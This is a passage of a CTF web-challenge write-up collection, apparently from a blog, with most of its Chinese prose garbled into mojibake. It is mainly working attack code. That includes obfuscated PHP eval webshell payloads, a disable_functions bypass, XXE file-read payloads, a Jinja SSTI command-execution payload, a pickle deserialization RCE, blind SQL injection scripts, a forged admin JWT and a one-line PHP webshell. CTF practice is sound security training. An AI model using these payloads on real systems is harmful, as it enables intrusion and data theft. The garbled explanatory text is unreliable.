Long.\");\n\t}\n\tif(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n\t\tdie(\"NO.\");\n\t}\n\t@eval($code);\n}\nelse{\n\thighlight_file(__FILE__);\n}\n?>\n```\n\nå–åç»•è¿‡ï¼Œå…ˆè¯•è¯•phpinfo\n\n```\ncode=(~%8F%97%8F%96%91%99%90)();\n```\n\nç¦ç”¨å¤§é‡ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œæ„é€ evalä½¿ç”¨èšå‰‘\n\n```\ncode=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);\n//assert((eval($_POST[a])))\n```\n\nå‘ç°è¯»ä¸åˆ°flagï¼Œçœ‹wpï¼Œæ˜¯ä¸€ä¸ªPHP7çš„ç¦ç”¨å‡½æ•°ç»•è¿‡æ¼æ´\n\n```\nè¿™é‡Œç”¨å·¥å…·\nåœ°å€https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\nç”±äºåœ¨/var/tmpç›®å½• æœ‰ä¸Šä¼ æƒé™ï¼Œå¯ä»¥ä¸Šä¼ bypass_disablefun_x64.soå’Œbypass_disablefunc.phpï¼ˆé‡å‘½åä¸ºshell.phpï¼‰ï¼Œ\n```\n\n```\nç„¶åéœ€è¦æ„é€ ä¸€ä¸ªæ–°çš„payload:\næ ¹æ®â€œ?code=${*GET}[_](https://www.cnblogs.com/yunqian2017/p/${_GET}[_]);&*=assert&_=eval($_POST['a'])â€\nä½¿ç”¨çš„æ˜¯å¼‚æˆ–ç»•è¿‡ï¼Œ\næœ€åçš„payloadæ˜¯\n```\n\n```\ncode=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/shell.php%27)&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so\n```\n\n## [MRCTF2020]å¥—å¨ƒ\n\næŸ¥çœ‹æºç \n\n```PHP\n$query = $_SERVER['QUERY_STRING'];\nif(substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){\n\tdie('Y0u are So cutE!');\n}\nif($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){\n\techo \"you are going to the next ~\";\n}\n```\n\nè¦æ±‚ä¼ å‚å˜é‡åä¸º`b_u_p_t`åˆè¦æ±‚é˜Ÿåˆ—å­—ç¬¦ä¸²ä¸­ä¸èƒ½æœ‰ä¸‹åˆ’çº¿ï¼Œå¯ä»¥ä½¿ç”¨ç©ºæ ¼ç»•è¿‡ï¼Œè€ŒåŒ¹é…èµ·å§‹ç»“å°¾éƒ½è¦æœ‰23333ï¼Œä½¿ç”¨æ¢è¡Œç»•è¿‡\n\n```\n?b u p t=23333%0A\n```\n\næŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰brainfuckæ³¨é‡Šå†…å®¹ï¼Œåœ¨æ§åˆ¶å°æ‰§è¡Œï¼Œå‘ç°éœ€è¦POSTä¼ å‚Merakï¼Œä¼ å…¥åæŸ¥çœ‹ä»£ç \n\n```PHP\n<?php \nerror_reporting(0); \ninclude 'takeip.php';\nini_set('open_basedir','.'); \ninclude 'flag.php';\nif(isset($_POST['Merak'])){ \n    highlight_file(__FILE__); \n    die(); \n} \nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; \n}\necho 'Local access only!'.\"<br/>\";\n$ip = getIp();\nif($ip!='127.0.0.1')\necho \"Sorry,you don't have permission!  Your ip is :\".$ip;\nif($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){\necho \"Your REQUEST is:\".change($_GET['file']);\necho file_get_contents(change($_GET['file'])); }\n?> \n```\n\nipåŒ¹é…ç»•è¿‡ä½¿ç”¨Client-ipè¯·æ±‚å¤´ï¼Œfile_get_contentsä½¿ç”¨dataä¼ªåè®®ä¼ å…¥\n\n```\n?2333=data:text/plain,todat is a happy day&file=ZmpdYSZmXGI=\n```\n\næŸ¥çœ‹æºç å¾—åˆ°flag\n\n## [WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢\n\nå¸ƒå°”ç›²æ³¨ï¼Œçœ‹è¿™é¢˜[[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL](#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL)\n\n```python\nimport requests\nurl=\"http://e3fad2bd-ba6f-41a9-bb23-275458f3c9ed.node4.buuoj.cn:81/\"\nname=\",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\"\nflag=\"flag{1234567890-bcde},\"\nfor i in range(1,100):\n    for j in flag:\n        parma={\n            'stunum':f\"1*(ascii(substr((select(group_concat(value))from(ctf.flag)),{i},1))={ord(j)})\"\n        }\n        tex=requests.get(url,params=parma).text\n        if \"Hi admin, your score is: 100\" in tex:\n            print(j,end='')\n            break\n```\n\n## [FBCTF2019]RCEService\n\n%0Aæ¢è¡Œæˆªæ–­ç»•è¿‡\n\n```\npayload:\ncmd={%0A\"cmd\":\"/bin/cat /home/rceservice/flag\"%0A}\n```\n\n## [Zer0pts2020]Can you guess it?\n\nå…ˆçœ‹æºç \n\n```PHP\n<?php\ninclude 'config.php'; // FLAG is defined in config.php\n\nif (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) {\n  exit(\"I don't know what you are thinking, but I won't let you read it :)\");\n}\n\nif (isset($_GET['source'])) {\n  highlight_file(basename($_SERVER['PHP_SELF']));\n  exit();\n}\n\n$secret = bin2hex(random_bytes(64));\nif (isset($_POST['guess'])) {\n  $guess = (string) $_POST['guess'];\n  if (hash_equals($secret, $guess)) {\n    $message = 'Congratulations! The flag is: ' . FLAG;\n  } else {\n    $message = 'Wrong.';\n  }\n}\n?>\n```\n\nåˆ©ç”¨çš„æ˜¯`basename`å‡½æ•°å’Œ`$_SERVER['PHP_SELF']`\n\nbasenameå‡½æ•°ä¼šè¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ï¼Œå¦‚\n\n```\nbasename(\"/var/www/html/index.php\")=index.php\n```\n\n`$_SERVER['PHP_SELF']`è¿”å›çš„æ˜¯urlä¸­æ–‡ä»¶éƒ¨åˆ†\n\n```\nhttp://127.0.0.1/test/index.php\nPHP_SELFå†…å®¹å°±æ˜¯/test/index.php\n```\n\nbasenameå‡½æ•°æœ‰ä¸€ä¸ªbugï¼Œå®ƒä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ payloadåœ¨config.phpæœ€åå†åŠ ä¸€ä¸ªéasciiå­—ç¬¦å³å¯\n\n```\npayload:\nindex.php/config.php/%FF?source\n```\n\n## [NCTF2019]Fake XML cookbook\n\néšæ„è¾“å…¥ç”¨æˆ·åå¯†ç ï¼ŒæŠ“åŒ…å‘ç°å†…å®¹ä½¿ç”¨xmlä¼ è¾“ï¼Œå°è¯•æ„é€ XXEæ¼æ´\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE note [\n<!ENTITY admin SYSTEM \"file:///etc/passwd\">\n]>\n<user><username>&admin;</username><password>123456</password></user>\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-03 23.20.24.png)\n\næµ‹è¯•å›æ˜¾æˆåŠŸ\n\nçŒœæµ‹flagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œæ‹¿åˆ°flag\n\n## [CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun\n\nçœ‹æ ‡é¢˜å†…å®¹ï¼Œæç¤ºè¦ä¹°LV6\n\n```\n## çˆ†ç ´*ç«™ï¼šèµ„é‡‘å‹Ÿé›† 11540.0\nikunä»¬å†²é¸­,ä¸€å®šè¦ä¹°åˆ°lv6!!!\n```\n\nå†™ä¸ªè„šæœ¬å…ˆæ‰¾åˆ°LV6\n\n```python\nimport requests\nurl=\"http://14806839-f3e4-4cb2-8762-4f6d771a95b0.node4.buuoj.cn:81/shop?page=\"\nname=\"static/img/lv/lv6.png\"\ni=2\nwhile 1:\n    tex=requests.get(url+str(i)).text\n    if name in tex:\n        print(i)\n    i+=1\n```\n\nå‘ç°åœ¨181é¡µ\n\néœ€è¦çš„money~~å¤ªè‡­äº†ä¸ä¹°äº†~~å¤ªå¤šäº†ï¼ŒæŠ“åŒ…æ›´æ”¹æŠ˜æ‰£è´­ä¹°ï¼Œè€Œåæç¤ºè¯¥é¡µé¢åªå…è®¸adminè®¿é—®ï¼ŒæŠ“åŒ…å‘ç°JWTï¼Œæ‰¾ä¸ª[è„šæœ¬](https://github.com/brendan-rius/c-jwt-cracker)çˆ†ç ´å¯†é’¥\n\nçˆ†ç ´å‡ºçš„å¯†é’¥ä¸º`1Kun`\n\nå†åœ¨[jwt.io]()ä¸­ç”Ÿæˆæ–°çš„jwt\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo\n```\n\n![](https://img-blog.csdnimg.cn/1be8776440c7499882db6dfd0e32d3cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZWxpZm9yc2hhcm9u,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-03 23.47.04.png)\n\nçœ‹æºç ä¸‹è½½æ–‡ä»¶\n\nå…³é”®å†…å®¹åœ¨sshop/views/Admin.py\n\n```python\n#Admin.py\nimport tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))\n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n\n```\n\né¢˜ç›®ä¸­æç¤ºäº†pickleï¼Œçœ‹çœ‹è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿\n\n> pythonçš„pickleæ¨¡å—å®ç°äº†åŸºæœ¬çš„æ•°æ®åºåˆ—å’Œååºåˆ—åŒ–\n>\n> | å‡½æ•°  | è¯´æ˜                             |\n> | ----- | -------------------------------- |\n> | dumps | å¯¹è±¡ååºåˆ—åŒ–ä¸ºbyteså¯¹è±¡          |\n> | dump  | å¯¹è±¡ååºåˆ—åŒ–åˆ°æ–‡ä»¶å¯¹è±¡ï¼Œå­˜å…¥æ–‡ä»¶ |\n> | loads | ä»byteså¯¹è±¡ååºåˆ—åŒ–              |\n> | load  | å¯¹è±¡ååºåˆ—åŒ–ï¼Œä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®   |\n\n```python\n#æ–‡ä»¶\n#åºåˆ—åŒ–\npickle.dump(obj, file, protocol=None,)\nobjè¡¨ç¤ºè¦è¿›è¡Œå°è£…çš„å¯¹è±¡(å¿…å¡«å‚æ•°ï¼‰\nfileè¡¨ç¤ºobjè¦å†™å…¥çš„æ–‡ä»¶å¯¹è±¡\nä»¥äºŒè¿›åˆ¶å¯å†™æ¨¡å¼æ‰“å¼€å³wb(å¿…å¡«å‚æ•°ï¼‰\n#ååºåˆ—åŒ–\npickle.load(file, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\", buffers=None)\nfileæ–‡ä»¶ä¸­è¯»å–å°å­˜åçš„å¯¹è±¡\nä»¥äºŒè¿›åˆ¶å¯è¯»æ¨¡å¼æ‰“å¼€å³rb(å¿…å¡«å‚æ•°)\n#å¯¹è±¡\n#åºåˆ—åŒ–\npickle.dumps(obj, protocol=None,*,fix_imports=True)\ndumps()æ–¹æ³•ä¸éœ€è¦å†™å…¥æ–‡ä»¶ä¸­ï¼Œç›´æ¥è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„byteså¯¹è±¡ã€‚\n#ååºåˆ—åŒ–\npickle.loads(bytes_object, *,fix_imports=True, encoding=\"ASCII\". errors=\"strict\")\nloads()æ–¹æ³•æ˜¯ç›´æ¥ä»byteså¯¹è±¡ä¸­è¯»å–åºåˆ—åŒ–çš„ä¿¡æ¯ï¼Œè€Œéä»æ–‡ä»¶ä¸­è¯»å–ã€‚\n```\n\næŸ¥æ‰¾åå¾—çŸ¥[pickleååºåˆ—åŒ–æ¼æ´](https://www.freebuf.com/articles/web/252189.html)\n\n> ç®€è€Œè¨€ä¹‹ï¼Œpickleçš„loadsåœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨`__reduce__`é­”æœ¯æ–¹æ³•ï¼Œä¹Ÿå°±å¯ä»¥åˆ©ç”¨è¯¥é­”æœ¯æ–¹æ³•æ„é€ payload\n\nå‘½ä»¤æ‰§è¡Œä¾‹å­\n\n```python\nimport pickle\nimport os\n\nclass Test2(object):\n    def __reduce__():\n    \t#è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•°\n        cmd = \"/usr/bin/id\" \n        return (os.system,(cmd,))\n\nif __name__ == \"__main__\":\n    test = Test2()\n    #æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ\n    result1 = pickle.dumps(test)\n    #æ‰§è¡Œååºåˆ—åŒ–æ“ä½œ\n    result2 = pickle.loads(result1)\n\n# __reduce__()é­”æ³•æ–¹æ³•çš„è¿”å›å€¼:\n# return(os.system,(cmd,))\n# 1.æ»¡è¶³è¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œå…ƒç»„ä¸­æœ‰ä¸¤ä¸ªå‚æ•°\n# 2.ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨å‡½æ•° : os.system()\n# 3.ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå…ƒç»„:(cmd,),å…ƒç»„ä¸­è¢«è°ƒç”¨çš„å‚æ•° cmd\n# 4. å› æ­¤åºåˆ—åŒ–æ—¶è¢«è§£ææ‰§è¡Œçš„ä»£ç æ˜¯ os.system(\"/usr/bin/id\")\n```\n\né‚£ä¹ˆå°±æ¥æ„é€ ä¸ªpayloadå§\n\n```python\n#python2\nimport pickle\nimport urllib\n\nclass payload(object):\n    def __reduce__(self):\n       return (eval, (\"open('/flag.txt','r').read()\",))\n\na = pickle.dumps(payload())\na = urllib.quote(a)\nprint a\n```\n\n```\nc__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.\n```\n\næäº¤å³å¯\n\n## [GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–\n\næºç \n\n```\n<?php \n#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼ \nheader(\"Content-Type: text/html;charset=utf-8\"); \nsession_start(); \nif(!isset($_SESSION['seed'])){ \n$_SESSION['seed']=rand(0,999999999); \n} \n\nmt_srand($_SESSION['seed']); \n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; \n$str=''; \n$len1=20; \nfor ( $i = 0; $i < $len1; $i++ ){ \n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);        \n} \n$str_show = substr($str, 0, 10); \necho \"<p id='p1'>\".$str_show.\"</p>\"; \n\n\nif(isset($_POST['num'])){ \n    if($_POST['num']===$str){x \n        echo \"<p id=flag>æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}</p>\"; \n    } \n    else{ \n        echo \"<p id=flag>æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§</p>\"; \n    } \n} \nshow_source(\"check.php\");\n```\n\nä¼ªéšæœºæ•°æ¼æ´ï¼Œå…ˆç®—å‡ºéœ€è¦çš„éšæœºæ•°å§\n\n```python\ns = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nkey = 'S5KnjyVcrs'\nm = ''\nfor i in key:\n    for j in range(len(s)):\n        if i == s[j]:\n            m += \"{} {} 0 {} \".format(j,j,len(s)-1)\nprint(m)\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-04 22.41.58.png)\n\nè·‘å‡ºæ¥ä¸€ä¸ªå°è¯•ä¸€ä¸‹\n\n```\n<?php\n#version:php7.3.4\nmt_srand(830361885);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\necho $str;\n```\n\næˆåŠŸ\n\n## [CSCCTF 2019 Qual]FlaskLight\n\nSSTI\n\nconfigé‡Œé¢æœ‰æç¤º\n\n```\n'SECRET_KEY': 'CCC{f4k3_Fl49_:v} CCC{the_flag_is_this_dir}'\n```\n\næ„é€ è¯»æ–‡ä»¶çš„ç±»å’¯\n\n```\nsearch={{''.__class__.__mro__[-1].__subclasses__()}}\né‡Œé¢æœ‰<class 'subprocess.Popen'>ï¼Œåœ¨258ä½\n```\n\n```\npayload:search={{''.__class__.__mro__[-1].__subclasses__()[258]('cat flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}\n```\n\n## [SUCTF 2019]Pythonginx\n\nè¿›å…¥å°±æ˜¯æºç \n\n```python\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname #è§£æå‡ºä¸»æœºå\n    if host == 'suctf.cc':\n        return \"æˆ‘æ‰Œ your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1] #å†æ¬¡è§£æä¸»æœºå\n    if host == 'suctf.cc':\n        return \"æˆ‘æ‰Œ your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'): #å¯¹www.example.comæŒ‰.åˆ’åˆ†ï¼Œå…ˆæŒ‰idnaç¼–ç ï¼Œå†utf-8è§£ç \n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost) #ç»„åˆå¥½è§£ç åçš„ä¸»æœºå\n    #å»æ‰ url ä¸­çš„ç©ºæ ¼\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname #è§£æå‡ºä¸»æœºåï¼Œè¦ç­‰äºsuctf.cc\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"æˆ‘æ‰Œ your problem? 333\"\n```\n\næä¸ªè„šæœ¬å°è¯•è·‘å‡ºæœ€åçš„cä¸­ä»¥idnaç¼–ç åå†ç»è¿‡utf8ç¼–ç ç»“æœä¸ºCçš„å†…å®¹\n\n```python\nfor i in range(128,65537):    \n    tmp=chr(i)\n    try:\n        res = tmp.encode('idna').decode('utf-8')\n        if res==\"c\":\n            print(tmp)\n    except:\n        continue\n```\n\nç»“æœï¼š\n\n```\nâ„‚\nâ„­\nâ…­\nâ…½\nâ’¸\nâ“’\nï¼£\nï½ƒ\n```\n\néšä¾¿æ‹ä¸€ä¸ªæ„é€ payloadï¼Œé¢˜ä¸­æç¤ºäº†ä½¿ç”¨äº†nginxï¼Œå°è¯•è®¿é—®é»˜è®¤nginxé…ç½®æ–‡ä»¶\n\n```\né…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx\nä¸»è¦é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf\nç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service\næ¨¡å—ï¼š/usr/lisb64/nginx/modules\nåº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx\nç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html\næ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx\nNginxé…ç½®æ–‡ä»¶ï¼š/usr/local/nginx/conf/nginx.conf\n```\n\n```\nfile://suctf.câ„‚/usr/local/nginx/conf/nginx.conf\n```\n\n```\nserver {\n    listen 80;\n    location / {\n        try_files $uri @app;\n    }\n    location @app {\n        include uwsgi_params;\n        uwsgi_pass unix:///tmp/uwsgi.sock;\n    }\n    location /static {\n        alias /app/static;\n    }\n    # location /flag {\n    #     alias /usr/fffffflag;\n    # }\n}\n```\n\næŸ¥çœ‹flagå³å¯\n\n```\nfile://suctf.câ„‚/usr/fffffflag\n```\n\n## [NCTF2019]True XML cookbook\n\nåˆä¸€ä¸ªXXEï¼Œå…ˆå°è¯•ä¸€ä¸‹ç›´æ¥è¯»flagå§\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE a [\n <!ENTITY abc SYSTEM \"file:///flag\">\n ]>\n<user><username>&abc;</username><password>123456</password></user>\n```\n\nemmmmmmæ–‡ä»¶ä¼¼ä¹ä¸å­˜åœ¨ï¼Œå†å°è¯•è¯»å–ç½‘ç«™æºç ï¼Œè¿”å›0æ²¡æœ‰å†…å®¹ï¼Œå†è¯•è¯•PHPä¼ªåè®®\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE a [\n <!ENTITY abc SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php\">\n ]>\n<user><username>&abc;</username><password>123456</password></user>\n```\n\n```php\n<?php\n/**\n* autor: c0ny1\n* date: 2018-2-7\n*/\n\n$USERNAME = 'admin'; //è´¦å·\n$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //å¯†ç \n$result = null;\n\nlibxml_disable_entity_loader(false);\n$xmlfile = file_get_contents('php://input');\n\ntry{\n\t$dom = new DOMDocument();\n\t$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n\t$creds = simplexml_import_dom($dom);\n\n\t$username = $creds->username;\n\t$password = $creds->password;\n\n\tif($username == $USERNAME && $password == $PASSWORD){\n\t\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",1,$username);\n\t}else{\n\t\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",0,$username);\n\t}\t\n}catch(Exception $e){\n\t$result = sprintf(\"<result><code>%d</code><msg>%s</msg></result>\",3,$e->getMessage());\n}\n\nheader('Content-Type: text/html; charset=utf-8');\necho $result;\n?>\n```\n\nè¿™ç©æ¥ä¹Ÿå¦¹å•¥ç”¨å•Š\n\nçœ‹çœ‹wpï¼Œæ‹“å±•XXEæ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–çš„ç‰¹æ€§æ¥æ¢æµ‹å†…ç½‘å­˜æ´»ä¸»æœºï¼Œè·å–/etc/hostsæ–‡ä»¶ï¼Œæˆ‘ä»¬åˆ†åˆ«è¯»å–å…³é”®æ–‡ä»¶ï¼š**/etc/hosts å’Œ /proc/net/arpï¼š**\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE a [\n <!ENTITY abc SYSTEM \"file:///etc/hosts\">\n ]>\n<user><username>&abc;</username><password>123456</password></user>\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-05 19.29.23.png)\n\næ‰¾åˆ°å†…ç½‘ä¸­IPï¼Œå°è¯•åœ¨ipæœ«å°¾çˆ†ç ´ï¼Œå‡ºflag\n\n~~ä¹Ÿä¸çŸ¥é“æˆ‘è¿™ä¸ªç¯å¢ƒæœ‰å•¥é—®é¢˜å°±æ˜¯è·‘ä¸å‡ºæ¥ï¼Œä»¥åå†è¯•è¯•~~\n\n## [CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb\n\nrobots.txt\n\n```\nDisallow: *.php.bak\n```\n\næ‹¿åˆ°image.phpæºç \n\n```php\n<?php\ninclude \"config.php\";\n\n$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";\n$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";\n\n$id=addslashes($id);\n$path=addslashes($path);\n\n$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);\n$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);\n\n$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");\n$row=mysqli_fetch_array($result,MYSQLI_ASSOC);\n\n$path=\"./\" . $row[\"path\"];\nheader(\"Content-Type: image/jpeg\");\nreadfile($path);\n```\n\næŸ¥çœ‹æºç ï¼Œå‘ç°ä¼ å…¥çš„idå’Œpathéƒ½å°†å˜é‡ç»è¿‡addslashesè½¬æ¢åçš„`\\0,%00,\\','`æ›¿æ¢ä¸ºç©º\n\né‚£ä¹ˆæˆ‘ä»¬å¦‚æœä¼ å…¥\\\\\\0ï¼Œå‰ä¸¤ä¸ªåæ–œæ ç”±äºè½¬ä¹‰ï¼Œç»“æœæ˜¯\\0ï¼Œç»è¿‡addslasheså˜ä¸º\\\\\\0ï¼Œå†ç»è¿‡str_replaceå˜ä¸º\\ï¼Œæ­¤æ—¶æ•´ä¸ªsqlè¯­å¥å˜ä¸º\n\n```mysql\nselect * from images where id='\\' or path='{$path}'\n```\n\næˆ‘ä»¬å°±å¯ä»¥åœ¨pathå¤„è¿›è¡Œsqlæ³¨å…¥\n\n```\ntables:images,users\n```\n\n```python\nimport requests\nurl=r\"http://3658d7dc-a0eb-4cb0-a891-f66217ffe401.node4.buuoj.cn:81/image.php?id=\\\\0&path=or id=\"\nname='admin1234567890,qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'\nfor i in range(1,100):\n    for j in name:\n        payload=f\"if((ascii(substr((select group_concat(password)from users),{i},1))={ord(j)}),1,0)--+\"\n        tex=requests.get(url+payload).text\n        if \"JFIF\" in tex:\n            print(j,end='')\n            break\n```\n\nåœ¨usersè¡¨ä¸­è·å¾—ç”¨æˆ·åå’Œå¯†ç `admin:157aeccdaba2cf3324cf`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-06 21.43.40.png)\n\nå°è¯•ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œæ˜¾ç¤ºä¸å…è®¸ä¸Šä¼ phpæ–‡ä»¶ï¼Œä¸Šä¼ ä»»æ„æ–‡ä»¶å°è¯•ï¼Œå¾—åˆ°æç¤º\n\n```\nI logged the file name you uploaded to logs/upload.b6acf587d3c1a6ea213bf45c8c143b95.log.php.\n```\n\nå°†æ–‡ä»¶åå†™å…¥log.phpæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶åå¤„å°è¯•æ„é€ æœ¨é©¬ï¼Œè¿˜æ˜¯æç¤ºä¸èƒ½ä¸Šä¼ ï¼Œçœ‹æ¥åœ¨æ–‡ä»¶åå¤„å¯¹phpè¿›è¡Œäº†è¿‡æ»¤ï¼Œå°è¯•çŸ­æ ‡ç­¾ç»•è¿‡æˆåŠŸ\n\n```\n<?= eval($_POST['kkk']);?>\n```\n\næ‹¿flag\n\n## [RCTF2015]EasySQL\n\nè¿›å…¥é¡µé¢å‘ç°æœ‰ä¸€ä¸ªç™»å½•ä¸€ä¸ªæ³¨å†Œï¼Œæ€€ç–‘æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œå°è¯•åœ¨ç”¨æˆ·åä¸­åŠ å…¥å•åŒå¼•å·æµ‹è¯•ï¼Œæ³¨å†ŒæˆåŠŸä½†æ˜¯ç™»å½•å¤±è´¥ï¼Œçœ‹çœ‹wpï¼Œä½¿ç”¨åæ–œæ è¿›è¡Œæµ‹è¯•ï¼Œåœ¨ä¿®æ”¹å¯†ç å¤„æµ‹è¯•æˆåŠŸï¼ŒæŠ¥é”™å›æ˜¾\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-06 21.58.42.png)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [HITCON 2017]SSRFme\n\n```PHP\n<?php\n    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\n        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];\n    }\n\n    echo $_SERVER[\"REMOTE_ADDR\"];\n\n    $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]);\n    @mkdir($sandbox);\n    @chdir($sandbox);\n\n    $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"]));\n    $info = pathinfo($_GET[\"filename\"]);\n    $dir  = str_replace(\".\", \"\", basename($info[\"dirname\"]));\n    @mkdir($dir);\n    @chdir($dir);\n    @file_put_contents(basename($info[\"basename\"]), $data);\n    